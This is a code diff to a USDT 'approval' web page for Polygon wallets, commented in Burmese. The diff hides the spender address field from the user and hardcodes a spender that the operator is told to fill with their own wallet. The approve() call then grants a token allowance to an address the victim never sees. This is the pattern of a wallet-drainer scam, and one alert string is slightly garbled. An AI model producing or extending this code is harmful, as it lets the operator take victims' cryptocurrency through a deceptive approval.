@@ -23,14 +23,8 @@
             <p id="walletAddress" class="text-xs text-slate-400 mt-2 text-center truncate"></p>
         </div>
 
-        <!-- Approval Form -->
+        <!-- Approval Form (Spender input field ကို ဖျောက်ထားသည်) -->
         <div class="space-y-4">
-            <div>
-                <label class="block text-xs font-medium text-slate-300 mb-1">Spender Contract Address (လက်ခံမည့်သူ/အဓိကလိပ်စာ)</label>
-                <!-- သင့်ရဲ့ Wallet Address ကို ဤနေရာတွင် Hardcode ထည့်သွင်းထားသည် (readOnly ဖြင့် ပြင်လို့မရအောင် ကာကွယ်ထားသည်) -->
-                <input type="text" id="spenderAddress" value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F" readonly class="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-xs text-slate-400 select-all cursor-not-allowed">
-            </div>
-
             <div>
                 <label class="block text-xs font-medium text-slate-300 mb-1">Amount (USDT ပမာဏ)</label>
                 <input type="number" id="amount" placeholder="ဥပမာ - 10" class="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-sm focus:outline-none focus:border-emerald-500">
@@ -53,6 +47,9 @@
         const POLYGON_CHAIN_ID = "0x89"; // 137 in decimal
         const USDT_POLYGON_ADDRESS = "0xc2132d05d31c914a87c6611c10748aeb04b58e2f";
         
+        // ⚠️ အောက်ပါနေရာတွင် သင့်ရဲ့ Polygon Wallet Address အစစ်ကို ထည့်သွင်းပါ ⚠️
+        const HARDCODED_SPENDER = "သင်၏_Polygon_Wallet_Address_အစစ်ကို_ဤနေရာတွင်ထည့်ပါ";
+
         // Minimal ERC20 ABI for approve
         const ERC20_ABI = [
             "function approve(address spender, uint256 amount) public returns (bool)"
@@ -117,13 +114,14 @@
         }
 
         async function approveUSDT() {
-            // HTML ထဲတွင် သတ်မှတ်ထားသော Spender Address ကို တိုက်ရိုက်ယူမည်
-            const spender = document.getElementById("spenderAddress").value.trim();
             const rawAmount = document.getElementById("amount").value.trim();
             const logElement = document.getElementById("statusLog");
 
+            // ကုဒ်ထဲတွင် သတ်မှတ်ထားသော Spender Address ကို ယူသုံးမည်
+            const spender = HARDCODED_SPENDER.trim();
+
             if (!ethers.isAddress(spender)) {
-                alert("မှန်ကန်သော Spender Address ထည့်သွင်းထားခြင်း မရှိပါ။");
+                alert("Spender Address မှန်ကန်စွာ ထည့်သွင်းထားခြင်း မရှိပါ။ (កုတ််ထဲတွင် Address အစစ်ကို ထည့်ရန်လိုသည်)");
                 return;
             }
 
